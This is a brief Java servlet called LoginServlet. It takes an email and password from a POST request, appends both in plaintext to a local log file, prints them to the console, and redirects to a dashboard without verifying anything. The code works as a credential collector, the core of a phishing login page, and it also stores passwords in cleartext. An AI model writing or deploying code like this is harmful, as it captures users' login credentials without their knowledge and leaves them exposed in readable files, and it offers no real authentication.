package com.example.servlets;

import java.io.*;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/LoginServlet")
public class LoginServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String email = request.getParameter("email");
        String password = request.getParameter("password");

        // Save login attempt to local file
        File file = new File("C:\\logs\\user_logins.txt"); // Change path if needed
        file.getParentFile().mkdirs(); // Ensure directory exists
        FileWriter writer = new FileWriter(file, true);
        writer.write("Email: " + email + " | Password: " + password + "\n");
        writer.close();

        System.out.println("Login Attempt: " + email + " | " + password);

        // Redirect user after login
        response.sendRedirect("dashboard.html"); // Change to your actual dashboard page
    }
}
